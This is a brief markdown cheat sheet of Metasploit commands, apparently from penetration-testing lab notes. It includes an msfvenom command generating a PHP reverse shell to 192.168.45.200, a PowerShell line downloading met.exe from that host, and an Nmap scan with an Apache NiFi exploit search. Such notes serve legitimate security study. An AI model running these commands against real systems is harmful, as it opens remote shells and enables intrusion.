# Metasploit Framework

## Start Metasploit Framework

```bash
sudo msfdb run
```

## msfvenom

```bash
msfvenom -p php/reverse_php LHOST=192.168.45.200 LPORT=443 -f raw -o rs.php
```

## handler

```bash
iwr -uri http://192.168.45.200/met.exe -Outfile met.exe
```

## capstone

```bash
db_nmap -A -p8080 192.168.228.225
search apache nifi
set target 1
```
